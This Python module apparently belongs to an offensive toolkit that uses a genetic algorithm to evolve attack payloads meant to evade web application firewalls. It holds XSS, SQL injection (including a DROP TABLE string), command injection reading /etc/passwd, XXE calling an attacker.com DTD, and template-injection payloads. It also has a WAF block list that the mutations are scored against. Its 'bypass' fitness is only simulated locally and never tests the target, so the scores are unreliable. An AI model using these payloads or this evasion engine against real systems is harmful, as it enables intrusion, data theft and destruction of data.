"""
Payload Evolver using Genetic Algorithms
Evolve attack payloads to bypass defenses
"""

import random
import logging
import asyncio
from typing import Dict, List, Any, Optional, Tuple
import hashlib
import base64


logger = logging.getLogger(__name__)


class Payload:
    """Represents an attack payload with genetic properties"""
    
    def __init__(self, content: str, encoding: str = 'utf-8'):
        self.content = content
        self.encoding = encoding
        self.fitness = 0.0
        self.generation = 0
        
    def mutate(self, mutation_rate: float = 0.1) -> 'Payload':
        """Apply mutation to payload"""
        mutated_content = list(self.content)
        
        for i in range(len(mutated_content)):
            if random.random() < mutation_rate:
                # Character substitution mutations
                mutations = [
                    lambda c: c.swapcase(),
                    lambda c: chr((ord(c) + 1) % 128),
                    lambda c: self._url_encode_char(c),
                    lambda c: self._double_encode_char(c),
                    lambda c: self._unicode_escape(c)
                ]
                mutation_func = random.choice(mutations)
                try:
                    mutated_content[i] = mutation_func(mutated_content[i])
                except:
                    pass
        
        return Payload(''.join(mutated_content), self.encoding)
    
    def crossover(self, other: 'Payload') -> Tuple['Payload', 'Payload']:
        """Perform crossover with another payload"""
        if len(self.content) < 2 or len(other.content) < 2:
            return self, other
        
        # Single-point crossover
        point1 = random.randint(1, len(self.content) - 1)
        point2 = random.randint(1, len(other.content) - 1)
        
        child1_content = self.content[:point1] + other.content[point2:]
        child2_content = other.content[:point2] + self.content[point1:]
        
        return Payload(child1_content), Payload(child2_content)
    
    def _url_encode_char(self, char: str) -> str:
        """URL encode a character"""
        return f"%{ord(char):02X}"
    
    def _double_encode_char(self, char: str) -> str:
        """Double URL encode a character"""
        return f"%25{ord(char):02X}"
    
    def _unicode_escape(self, char: str) -> str:
        """Unicode escape a character"""
        return f"\\u{ord(char):04x}"
    
    def __str__(self) -> str:
        return f"Payload(fitness={self.fitness:.2f}, gen={self.generation})"


class PayloadEvolver:
    """
    Genetic Algorithm-based Payload Evolution Engine
    
    Evolves attack payloads to bypass security controls
    """
    
    def __init__(self, config: Dict[str, Any]):
        self.config = config
        self.logger = logging.getLogger(__name__)
        
        # Base payload templates
        self.payload_templates = {
            'xss': [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "<iframe src='javascript:alert(1)'>",
            ],
            'sqli': [
                "' OR '1'='1",
                "1' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "1' AND 1=1--",
                "admin'--",
            ],
            'command_injection': [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd",
                "`id`",
                "$(uname -a)",
            ],
            'xxe': [
                "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/evil.dtd'>]>",
            ],
            'ssti': [
                "{{7*7}}",
                "{{config.items()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ]
        }
    
    async def evolve_payloads(
        self,
        target: str,
        population_size: int = 100,
        generations: int = 50,
        mutation_rate: float = 0.1,
        payload_type: str = 'xss'
    ) -> List[Dict[str, Any]]:
        """
        Evolve payloads using genetic algorithms
        """
        self.logger.info(f"Evolving {payload_type} payloads: {population_size} population, {generations} generations")
        
        # Initialize population
        population = self._initialize_population(payload_type, population_size)
        
        evolution_history = []
        best_payloads = []
        
        for generation in range(generations):
            # Evaluate fitness
            await self._evaluate_fitness(population, target)
            
            # Sort by fitness
            population.sort(key=lambda p: p.fitness, reverse=True)
            
            # Record best payload
            best = population[0]
            evolution_history.append({
                'generation': generation,
                'best_fitness': best.fitness,
                'avg_fitness': sum(p.fitness for p in population) / len(population),
                'diversity': self._calculate_diversity(population)
            })
            
            if best.fitness > 0.8:
                best_payloads.append({
                    'payload': best.content,
                    'fitness': best.fitness,
                    'generation': generation
                })
            
            # Selection and reproduction
            population = await self._evolve_generation(
                population,
                mutation_rate,
                population_size
            )
        
        # Final evaluation
        await self._evaluate_fitness(population, target)
        population.sort(key=lambda p: p.fitness, reverse=True)
        
        results = {
            'payload_type': payload_type,
            'total_generations': generations,
            'population_size': population_size,
            'mutation_rate': mutation_rate,
            'best_payloads': best_payloads[:10],
            'final_best': {
                'payload': population[0].content,
                'fitness': population[0].fitness
            },
            'evolution_history': evolution_history[-10:],  # Last 10 generations
            'convergence': self._check_convergence(evolution_history)
        }
        
        self.logger.info(f"Evolution complete: Best fitness = {population[0].fitness:.2f}")
        
        return [results]
    
    def _initialize_population(self, payload_type: str, size: int) -> List[Payload]:
        """Initialize random population of payloads"""
        templates = self.payload_templates.get(payload_type, self.payload_templates['xss'])
        population = []
        
        for i in range(size):
            template = random.choice(templates)
            
            # Add some initial variation
            if random.random() < 0.3:
                # Apply encoding
                variations = [
                    lambda x: base64.b64encode(x.encode()).decode(),
                    lambda x: x.replace('<', '&lt;').replace('>', '&gt;'),
                    lambda x: ''.join(f'\\x{ord(c):02x}' for c in x),
                    lambda x: x.upper(),
                    lambda x: x.lower()
                ]
                try:
                    template = random.choice(variations)(template)
                except:
                    pass
            
            payload = Payload(template)
            population.append(payload)
        
        return population
    
    async def _evaluate_fitness(self, population: List[Payload], target: str):
        """Evaluate fitness of each payload"""
        for payload in population:
            # Simulate fitness evaluation based on multiple criteria
            fitness_components = []
            
            # 1. Evasion capability (length, encoding, obfuscation)
            evasion_score = self._calculate_evasion_score(payload.content)
            fitness_components.append(evasion_score * 0.3)
            
            # 2. Syntax validity
            syntax_score = self._calculate_syntax_score(payload.content)
            fitness_components.append(syntax_score * 0.2)
            
            # 3. Simulated bypass score
            bypass_score = await self._simulate_waf_bypass(payload.content, target)
            fitness_components.append(bypass_score * 0.5)
            
            payload.fitness = sum(fitness_components)
    
    def _calculate_evasion_score(self, content: str) -> float:
        """Calculate evasion capability score"""
        score = 0.5  # Base score
        
        # Favor certain evasion techniques
        if '%' in content:  # URL encoding
            score += 0.1
        if '\\x' in content or '\\u' in content:  # Hex/Unicode encoding
            score += 0.15
        if 'eval' in content.lower() or 'exec' in content.lower():  # Dynamic execution
            score += 0.1
        if any(c.isupper() for c in content) and any(c.islower() for c in content):  # Case variation
            score += 0.05
        if len(content) > 50:  # Length-based obfuscation
            score += 0.1
        
        return min(score, 1.0)
    
    def _calculate_syntax_score(self, content: str) -> float:
        """Calculate syntax validity score"""
        score = 0.5
        
        # Check for balanced brackets/quotes
        if content.count('(') == content.count(')'):
            score += 0.1
        if content.count('[') == content.count(']'):
            score += 0.1
        if content.count('{') == content.count('}'):
            score += 0.1
        if content.count("'") % 2 == 0:
            score += 0.1
        if content.count('"') % 2 == 0:
            score += 0.1
        
        return min(score, 1.0)
    
    async def _simulate_waf_bypass(self, content: str, target: str) -> float:
        """Simulate WAF bypass attempt"""
        await asyncio.sleep(0.001)  # Simulate check
        
        # Simulate WAF rules
        blocked_patterns = [
            '<script', 'alert(', 'onerror=', 'onload=',
            'UNION', 'SELECT', 'DROP', 'INSERT',
            '/etc/passwd', 'cmd.exe', 'whoami'
        ]
        
        content_lower = content.lower()
        bypass_score = 1.0
        
        for pattern in blocked_patterns:
            if pattern.lower() in content_lower:
                bypass_score -= 0.1
        
        # Bonus for obfuscation
        if not any(pattern.lower() in content_lower for pattern in blocked_patterns):
            bypass_score += 0.2
        
        return max(0.0, min(bypass_score, 1.0))
    
    async def _evolve_generation(
        self,
        population: List[Payload],
        mutation_rate: float,
        target_size: int
    ) -> List[Payload]:
        """Create next generation through selection, crossover, and mutation"""
        new_population = []
        
        # Elitism: Keep top 10%
        elite_size = max(1, target_size // 10)
        new_population.extend(population[:elite_size])
        
        # Generate rest through crossover and mutation
        while len(new_population) < target_size:
            # Tournament selection
            parent1 = self._tournament_selection(population, tournament_size=3)
            parent2 = self._tournament_selection(population, tournament_size=3)
            
            # Crossover
            if random.random() < 0.7:  # Crossover probability
                child1, child2 = parent1.crossover(parent2)
            else:
                child1, child2 = parent1, parent2
            
            # Mutation
            if random.random() < mutation_rate:
                child1 = child1.mutate(mutation_rate)
            if random.random() < mutation_rate:
                child2 = child2.mutate(mutation_rate)
            
            child1.generation = population[0].generation + 1
            child2.generation = population[0].generation + 1
            
            new_population.extend([child1, child2])
        
        return new_population[:target_size]
    
    def _tournament_selection(self, population: List[Payload], tournament_size: int = 3) -> Payload:
        """Select individual using tournament selection"""
        tournament = random.sample(population, min(tournament_size, len(population)))
        return max(tournament, key=lambda p: p.fitness)
    
    def _calculate_diversity(self, population: List[Payload]) -> float:
        """Calculate population diversity"""
        if len(population) < 2:
            return 0.0
        
        unique_payloads = len(set(p.content for p in population))
        return unique_payloads / len(population)
    
    def _check_convergence(self, history: List[Dict[str, Any]], window: int = 10) -> bool:
        """Check if evolution has converged"""
        if len(history) < window:
            return False
        
        recent_fitness = [h['best_fitness'] for h in history[-window:]]
        fitness_variance = sum((f - sum(recent_fitness) / len(recent_fitness)) ** 2 
                              for f in recent_fitness) / len(recent_fitness)
        
        return fitness_variance < 0.01
